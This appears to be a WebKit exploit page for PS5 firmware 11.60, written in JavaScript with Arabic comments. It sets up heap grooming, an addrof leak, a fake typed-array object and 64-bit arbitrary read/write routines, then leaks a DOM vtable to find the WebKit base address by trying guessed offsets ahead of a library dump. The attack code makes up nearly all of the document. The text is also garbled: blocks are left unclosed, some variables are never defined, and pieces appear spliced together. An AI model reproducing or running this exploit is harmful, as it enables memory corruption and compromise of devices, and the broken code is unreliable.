<!--
  PS5 FW 11.60 / WebKit 616.1 genuine-view R/W bootstrap.

  A six-inline-property JSFinalObject supplies exactly 0x30 controlled bytes at
  addrof(host)+0x10.  The fake header uses the VM-bootstrap String StructureID
  0x4250 (third Structure allocated by VM::VM) with Uint8Array's inline type.
  q1 is zero, so concurrent GC dispatch through the String visitor is inert.
  q2 is a genuine Uint8Array over an explicit ArrayBuffer. The fake first reads
  that cell, then upgrades its own header to the genuine Uint8Array StructureID.

  The fake byte-writes only the genuine view's m_vector. The genuine view reads a
  second Uint8Array cell, follows its backing pointer, changes A5 -> 5A -> A5,
  and is restored to its original backing before the fake value is released.
  Both genuine views use WastefulTypedArray mode 0x58, whose GC visitor retains
  the ArrayBuffer through the butterfly and never marks m_vector.

  This permits at most ten ordinary refresh attempts because allocator misses
  return a clean deserialization TypeError. A confirmed pass blocks later runs.
-->

    else
        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
            + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
            + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));

    if (writePass)
        mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
    else
        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
            + "-restore=" + restoreObserved);

    if (readPass && writePass) {
        mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
    }

    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
        + "-target-byte=" + targetView[0].toString(16)
        + "-length-word=" + lengthWord.keep.toString(16));
    setTimeout(function () { mark("SURVIVED-T100"); }, 100);
    setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
    setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (var i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
            + "-fake=" + hex(fakeAddress));

        // Preserve /r's exact synchronous free/getter sequence.
        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        return;
    }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":"
            + String(captureError && captureError.message).slice(0, 80));
        return;
    }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
            + "-plausible=" + plausible + "-covered=" + sourceCovered);
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
        + "-delta=0x10");
    runGroomAndLoad();
}

var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
// This dedicated ARW-only copy is intentionally repeatable: every refresh runs

allowAgain = true;
var attemptKey = REVISION + ":attempts";
var passKey = REVISION + ":passed";
var blockKey = REVISION + ":blocked";
var priorAttempts = 0;

try {

        priorAttempts = 0;

} catch (_) {}
attemptNumber = priorAttempts + 1;

mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
    + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);

if (alreadyPassed && !allowAgain) {

} else if (alreadyBlocked && !allowAgain) {
    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {

} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"

}

// دالة قراءة آمنة 64-bit
// تستخدم targetView وتزور m_vector مؤقتاً ثم تستعيده
function safeRead64(addr) {
    let addrLow = addr & 0xFFFFFFFF;
    let addrHigh = Math.floor(addr / 0x100000000);
    
    // عنوان m_vector الخاص بـ targetView = targetAddress + 0x10
    let mVecAddr = targetAddress + 0x10;
    let mVecLow = mVecAddr & 0xFFFFFFFF;
    let mVecHigh = Math.floor(mVecAddr / 0x100000000);
    
    // الخطوة 1: نوجه targetView ليقرأ من عنوان m_vector الخاص به
    targetView[0x10] = mVecLow & 0xff;
    targetView[0x11] = (mVecLow >> 8) & 0xff;
    targetView[0x12] = (mVecLow >> 16) & 0xff;
    targetView[0x13] = (mVecLow >> 24) & 0xff;
    targetView[0x14] = mVecHigh & 0xff;
    targetView[0x15] = (mVecHigh >> 8) & 0xff;
    targetView[0x16] = 0;
    targetView[0x17] = 0;
    
    // الخطوة 2: نكتب العنوان المطلوب في m_vector
    targetView[0] = addrLow & 0xff;
    targetView[1] = (addrLow >> 8) & 0xff;
    targetView[2] = (addrLow >> 16) & 0xff;
    targetView[3] = (addrLow >> 24) & 0xff;
    targetView[4] = addrHigh & 0xff;
    targetView[5] = (addrHigh >> 8) & 0xff;
    targetView[6] = 0;
    targetView[7] = 0;
    
    // الخطوة 3: نقرأ البيانات
    let resLow = (targetView[0] | (targetView[1] << 8) | (targetView[2] << 16) | (targetView[3] << 24)) >>> 0;
    let resHigh = (targetView[4] | (targetView[5] << 8) | (targetView[6] << 16) | (targetView[7] << 24)) >>> 0;
    
    // الخطوة 4: استعادة m_vector الأصلي (targetVector من الـ PoC)
    let origLow = targetVector & 0xFFFFFFFF;
    let origHigh = Math.floor(targetVector / 0x100000000);
    
    targetView[0x10] = mVecLow & 0xff;
    targetView[0x11] = (mVecLow >> 8) & 0xff;
    targetView[0x12] = (mVecLow >> 16) & 0xff;
    targetView[0x13] = (mVecLow >> 24) & 0xff;
    targetView[0x14] = mVecHigh & 0xff;
    targetView[0x15] = (mVecHigh >> 8) & 0xff;
    
    targetView[0] = origLow & 0xff;
    targetView[1] = (origLow >> 8) & 0xff;
    targetView[2] = (origLow >> 16) & 0xff;
    targetView[3] = (origLow >> 24) & 0xff;
    targetView[4] = origHigh & 0xff;
    targetView[5] = (origHigh >> 8) & 0xff;
    targetView[6] = 0;
    targetView[7] = 0;
    
    return resLow + resHigh * 0x100000000;
}

// دالة كتابة آمنة 64-bit
function safeWrite64(addr, value) {
    let addrLow = addr & 0xFFFFFFFF;
    let addrHigh = Math.floor(addr / 0x100000000);
    let valLow = value & 0xFFFFFFFF;
    let valHigh = Math.floor(value / 0x100000000);
    
    let mVecAddr = targetAddress + 0x10;
    let mVecLow = mVecAddr & 0xFFFFFFFF;
    let mVecHigh = Math.floor(mVecAddr / 0x100000000);
    
    targetView[0x10] = mVecLow & 0xff;
    targetView[0x11] = (mVecLow >> 8) & 0xff;
    targetView[0x12] = (mVecLow >> 16) & 0xff;
    targetView[0x13] = (mVecLow >> 24) & 0xff;
    targetView[0x14] = mVecHigh & 0xff;
    targetView[0x15] = (mVecHigh >> 8) & 0xff;
    
    targetView[0] = addrLow & 0xff;
    targetView[1] = (addrLow >> 8) & 0xff;
    targetView[2] = (addrLow >> 16) & 0xff;
    targetView[3] = (addrLow >> 24) & 0xff;
    targetView[4] = addrHigh & 0xff;
    targetView[5] = (addrHigh >> 8) & 0xff;
    
    // الآن targetView يشير إلى addr، نكتب القيمة
    targetView[0x10] = addrLow & 0xff;
    targetView[0x11] = (addrLow >> 8) & 0xff;
    targetView[0x12] = (addrLow >> 16) & 0xff;
    targetView[0x13] = (addrLow >> 24) & 0xff;
    targetView[0x14] = addrHigh & 0xff;
    targetView[0x15] = (addrHigh >> 8) & 0xff;
    
    targetView[0] = valLow & 0xff;
    targetView[1] = (valLow >> 8) & 0xff;
    targetView[2] = (valLow >> 16) & 0xff;
    targetView[3] = (valLow >> 24) & 0xff;
    targetView[4] = valHigh & 0xff;
    targetView[5] = (valHigh >> 8) & 0xff;
    
    // استعادة
    let origLow = targetVector & 0xFFFFFFFF;
    let origHigh = Math.floor(targetVector / 0x100000000);
    
    targetView[0x10] = mVecLow & 0xff;
    targetView[0x11] = (mVecLow >> 8) & 0xff;
    targetView[0x12] = (mVecLow >> 16) & 0xff;
    targetView[0x13] = (mVecLow >> 24) & 0xff;
    targetView[0x14] = mVecHigh & 0xff;
    targetView[0x15] = (mVecHigh >> 8) & 0xff;
    
    targetView[0] = origLow & 0xff;
    targetView[1] = (origLow >> 8) & 0xff;
    targetView[2] = (origLow >> 16) & 0xff;
    targetView[3] = (origLow >> 24) & 0xff;
    targetView[4] = origHigh & 0xff;
    targetView[5] = (origHigh >> 8) & 0xff;
}

function leakASLR() {
    plog("[*] جاري تسريب WebKit Base...");
    btnASLR.disabled = true;
    
    try {
        // الطريقة المضمونة: نستخدم globalThis ونضيف خاصية له
        // ثم نقرأها من الـ butterfly
        
        // 1. إنشاء كائن DOM
        let ta = document.createElement("textarea");
        
        // 2. نخزنه في globalThis كخاصية
        globalThis.__leakTarget = ta;
        
        // 3. نحتاج عنوان globalThis
        // globalThis في WebKit هو JSGlobalObject
        // يمكننا الحصول عليه من خلال قراءة window.__proto__ أو عبر الـ scope chain
        
        // الطريقة الأبسط: نستخدم الـ addrof الموجود في الـ PoC الأصلي
        // الـ PoC الأصلي يستخدم Symbol.prototype.toString
        // سنعيد استخدام نفس التقنية
        
        plog("[*] جاري تسريب عنوان textarea عبر addrof...");
        
        // نستخدم نفس تقنية الـ PoC الأصلي (Symbol.toString)
        let carrierFunc = function() { return 7; };
        carrierFunc[0] = ta;
        carrierFunc[1] = ta;
        carrierFunc[2] = ta;
        
        // نستخدم الـ leakedScope من الـ PoC الأصلي إذا كان متاحاً
        if (typeof leakedScope !== 'undefined' && leakedScope !== null) {
            Object.defineProperty(leakedScope, "g", { 
                get: carrierFunc, 
                configurable: true 
            });
            let wrapper = Object(leakedScope.g);
            let str = Symbol.prototype.toString.call(wrapper);
            
            // نستخرج العنوان من الـ string
            let addr = 0;
            for (let i = 0; i < 8 && i < str.length - 7; i++) {
                let c = str.charCodeAt(7 + i);
                addr += c * Math.pow(256, i);
            }
            
            if (addr > 0x100000000 && addr < 0xFFFFFFFFFFFF) {
                plog("[+] textarea address (from addrof): 0x" + addr.toString(16));
                leakFromAddr(addr);
                return;
            }
        }
        
        // الطريقة البديلة: نقرأ مباشرة من الـ Heap
        plog("[*] الطريقة البديلة: قراءة من الـ Heap مباشرة...");
        
        // نعرف أن fakeHost يحتوي على rwView في q2 (offset 0x20)
        // نقرأ عنوان rwView من fakeHost

        // الآن نضيف ta إلى fakeHost كخاصية جديدة

        fakeHost.__ta = ta;
        
        // نحاول قراءة من عدة offsets محتملة

        // نحاول الـ butterfly أولاً

        plog("[+] fakeHost butterfly: 0x" + butterflyAddr.toString(16));
        
        if (butterflyAddr > 0x100000000) {
            // الخصائص الديناميكية تُخزن قبل الـ butterfly
            for (let offset = -8; offset >= -64; offset -= 8) {
                let val = safeRead64(butterflyAddr + offset);
                let candidate = val & 0xFFFFFFFFFFFF;
                // نتحقق هل هو عنوان صالح
                if (candidate > 0x100000000 && candidate < 0xFFFFFFFFFFFF && candidate % 8 === 0) {
                    // نتحقق هل يبدو كـ DOM element (نقرأ أول 8 بايت)

                        break;

        // إذا لم نجده في الـ butterfly، نجرب الـ inline slots

                let candidate = val & 0xFFFFFFFFFFFF;

// دالة مساعدة: تسريب من عنوان معروف
function leakFromAddr(objAddr) {
    plog("[*] جاري قراءة vtable من: 0x" + objAddr.toString(16));
    
    // نجرب عدة offsets للـ vtable pointer
    let vtablePtr = 0;
    let vtableOffset = 0;
    
    // في WebKit، الـ vtable pointer عادة عند 0x00 أو يُقرأ من الـ Structure
    // الطريقة الصحيحة: نقرأ الـ JSCell header، ثم نقرأ الـ vtable من الـ Structure
    
    // أولاً: نقرأ الـ JSCell (أول 8 بايت)
    let cellHeader = safeRead64(objAddr);
    let structureID = cellHeader & 0xFFFF;
    plog("[+] JSCell header: 0x" + cellHeader.toString(16));
    plog("[+] StructureID: 0x" + structureID.toString(16));
    
    // في WebKit، الـ vtable يُخزن في الـ Structure
    // Structure address = VM::heap + structureID * 8
    // لكن هذا معقد. الطريقة الأبسط:
    
    // نقرأ من offsets مختلفة للـ vtable
    let offsetsToTry = [0x08, 0x10, 0x18, 0x20, 0x28, 0x30];
    
    for (let off of offsetsToTry) {
        let ptr = safeRead64(objAddr + off);
        if (ptr > 0x100000000 && ptr < 0xFFFFFFFFFFFF && ptr % 8 === 0) {
            // نتحقق هل العنوان الذي يشير إليه يبدو كـ vtable
            let firstEntry = safeRead64(ptr);
            if (firstEntry > 0x100000000 && firstEntry < 0xFFFFFFFFFFFF && firstEntry % 4 === 0) {
                vtablePtr = ptr;
                vtableOffset = off;
                plog("[+] vtable ptr found at offset 0x" + off.toString(16) + ": 0x" + ptr.toString(16));
                break;
            }
        }
    }
    
    if (vtablePtr === 0) {
        plog("[⚠️] لم نجد vtable مباشر. نجرب طريقة الـ DOM vtable...");
        // في DOM objects، الـ vtable عادة عند offset 0x08 من الـ C++ object
        // والـ DOM object يبدأ بعد الـ JSCell
        // لنجرب offset 0x10 و 0x18
        vtablePtr = safeRead64(objAddr + 0x10);
        if (vtablePtr < 0x100000000 || vtablePtr > 0xFFFFFFFFFFFF) {
            vtablePtr = safeRead64(objAddr + 0x18);
        }
        if (vtablePtr < 0x100000000 || vtablePtr > 0xFFFFFFFFFFFF) {
            plog("[❌] فشل في إيجاد vtable!");
            btnASLR.disabled = false;
            return;
        }

    plog("[+] vtable address: 0x" + vtablePtr.toString(16));
    
    // نقرأ أول دالة في الـ vtable

    // الآن نحسب الـ Base
    // ⚠️ هذا الـ Offset يجب تحديثه بعد الـ Dump
    // سنستخدم عدة قيم محتملة ونرى أيها يعطينا ELF magic صحيح
    
    plog("[*] جاري تجربة عدة offsets لإيجاد الـ Base الصحيح...");
    
    let possibleOffsets = [
        0x1358E0,  // FW 1.00-4.51 (من UMTX2)
        0x150000,  // تقدير
        0x1A0000,  // تقدير
        0x200000,  // تقدير
        0x250000,  // تقدير
        0x300000,  // تقدير
        0x400000,  // تقدير
        0x500000,  // تقدير
        0x600000,  // تقدير
        0x700000,  // تقدير
        0x800000,  // تقدير
        0x900000,  // تقدير
        0xA00000,  // تقدير
        0xB00000,  // تقدير
        0xC00000,  // تقدير
        0xD00000,  // تقدير
        0xE00000,  // تقدير
        0xF00000,  // تقدير
        0x1000000, // تقدير
        0x1200000, // تقدير
        0x1500000, // تقدير
        0x1800000, // تقدير
        0x1B00000, // تقدير
        0x1E00000, // تقدير
        0x2000000, // تقدير
        0x2500000, // تقدير
        0x2A00000, // تقدير
        0x3000000, // تقدير
    ];
    
    let foundBase = 0;
    let foundOffset = 0;
    
    for (let off of possibleOffsets) {
        let candidateBase = firstFunc - off;
        
        // نتحقق: هل العنوان يبدو كـ base address؟
        if (candidateBase < 0x100000000 || candidateBase > 0xFFFFFFFFFFFF) continue;
        if (candidateBase % 0x1000 !== 0) continue; // الـ base عادة محاذي لـ 4KB
        
        // نقرأ أول 4 بايت ونتحقق من ELF magic
        let magic = safeRead64(candidateBase) & 0xFFFFFFFF;
        
        if (magic === 0x464C457F) { // 0x7F 'E' 'L' 'F'
            foundBase = candidateBase;
            foundOffset = off;
            plog("[✅] وجدنا ELF magic صحيح!");
            plog("    Base: 0x" + candidateBase.toString(16));
            plog("    Offset: 0x" + off.toString(16));
            break;
        }
    }
    
    if (foundBase === 0) {
        plog("[⚠️] لم نجد ELF magic مع أي offset.");
        plog("[ℹ️] سنستخدم أول عنوان محتمل ونحاول الـ Dump...");
        // نستخدم offset تقريبي
        foundBase = firstFunc - 0x1358E0;
        foundOffset = 0x1358E0;
    }
    
    webKitBaseAddr = foundBase;
    plog("========================================");
    plog("🔥 WEBKIT BASE: 0x" + webKitBaseAddr.toString(16));
    plog("🔥 OFFSET USED: 0x" + foundOffset.toString(16));
    plog("========================================");
    
    btnDump.disabled = false;
    plog("[ℹ️] اضغط الزر الثالث (تفريغ المكتبة).");
}
